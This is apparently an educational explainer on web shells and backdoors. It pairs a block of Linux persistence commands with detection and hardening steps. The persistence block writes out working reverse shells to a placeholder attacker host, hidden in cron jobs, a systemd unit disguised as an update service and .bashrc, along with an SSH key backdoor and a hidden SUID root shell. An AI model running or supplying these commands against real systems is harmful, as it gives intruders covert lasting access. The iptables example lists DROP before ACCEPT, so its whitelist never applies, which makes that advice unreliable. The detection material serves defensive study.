Web Shells & Backdoors

Post-exploitation · Persistence — deploy a remote access mechanism after initial foothold, survive reboots, evade detection

After gaining initial code execution (via file upload, RCE, SSTI, deserialization, etc.), an attacker plants a persistent access mechanism. Web shells provide HTTP-based command execution; reverse shells give an interactive terminal; backdoors survive reboots. Each has a different operational profile — detectability vs. capability vs. persistence.

Web shells provide command execution through HTTP requests — they survive web server restarts and don't require any outbound connection, making them firewall-friendly.

Persistence mechanisms survive reboots and process kills. They require higher privileges and carry higher detection risk — use only when the engagement calls for it.

Linux persistence techniques
# 1. Cron job — runs at interval echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" \ | crontab - # Check: crontab -l # 2. SSH authorized_keys — public key backdoor mkdir -p ~/.ssh echo "ssh-rsa AAAA...attacker-public-key..." >> ~/.ssh/authorized_keys chmod 600 ~/.ssh/authorized_keys # Now SSH in anytime: ssh user@target -i attacker_private_key # 3. /etc/cron.d/ — system-wide (root needed) echo '* * * * * root bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' \ > /etc/cron.d/system-update # 4. Systemd service — restarts automatically cat > /etc/systemd/system/update-service.service << 'END' [Unit] Description=System Update Service [Service] ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' Restart=always RestartSec=60 [Install] WantedBy=multi-user.target END systemctl enable update-service systemctl start update-service # 5. ~/.bashrc / ~/.bash_profile — fires on login echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &' >> ~/.bashrc # 6. SUID backdoor (needs root) cp /bin/bash /tmp/.hidden_bash chmod u+s /tmp/.hidden_bash # Later: /tmp/.hidden_bash -p → root shell

Detecting web shells and backdoors from the defender's perspective — what to look for and how to prevent deployment.

Web shell detection
# File system — find recently modified PHP files find /var/www -name "*.php" -newer /var/www/html/index.php -ls find /var/www -name "*.php" -mtime -7 -exec grep -l "system\|exec\|passthru\|eval\|base64_decode" {} \; # Linux Malware Detect (maldet) maldet --scan-all /var/www/ # ClamAV clamscan -r /var/www/ --infected # YARA rules — pattern matching yara -r webshell_rules.yar /var/www/ # Web server access logs — look for shell usage patterns grep -E "(cmd=|c=|command=|exec=|shell=)" /var/log/nginx/access.log grep "200" /var/log/apache2/access.log | grep -E "\.(php|aspx?|jsp)\?" | \ awk '{print $7}' | sort | uniq -c | sort -rn | head -20 # Detect obfuscated eval() patterns grep -rP "eval\s*\(\s*(base64_decode|str_rot13|gzinflate|gzuncompress)" /var/www/
Reverse shell / network detection
# Check for unexpected outbound connections ss -tnp | grep ESTABLISHED netstat -tnp | grep "ESTABLISHED" # Look for: web server process (apache2, nginx, php-fpm) # connecting to external IPs on unusual ports # Audit listening processes ss -tlnp # Unexpected listeners on high ports = bind shell # Monitor with auditd (real-time) auditctl -a always,exit -F arch=b64 -S execve -k exec_monitoring ausearch -k exec_monitoring | grep -v "legitimate_process" # EDR / SIEM detection rules: # - Child process of web server (apache spawning bash) # - Web server process making outbound TCP connection # - /bin/bash with stdin/stdout redirected to socket
Prevention — stop shells before they land Root fix
All backdoor deployment requires an initial vulnerability. Fix the underlying vector and you prevent the backdoor entirely. Defense in depth slows down attackers who do get in.
# 1. Disable PHP execution in upload directories (covered in file upload explainer) # nginx: no php-fpm passthrough for /uploads/ # Apache: php_flag engine off in /uploads/.htaccess # 2. Run web server as least-privilege user # www-data should NOT have write access to its own document root chown -R root:root /var/www/html chmod -R 755 /var/www/html # www-data can read but NOT write # 3. Read-only filesystem (containers) # Docker: --read-only flag # k8s: readOnlyRootFilesystem: true # 4. Outbound firewall — block all except whitelisted destinations iptables -A OUTPUT -m owner --uid-owner www-data -j DROP iptables -A OUTPUT -m owner --uid-owner www-data -d 8.8.8.8 -j ACCEPT # Web server process cannot initiate connections to attacker # 5. File integrity monitoring aide --init # AIDE — takes baseline aide --check # Alerts on any file changes in /var/www/
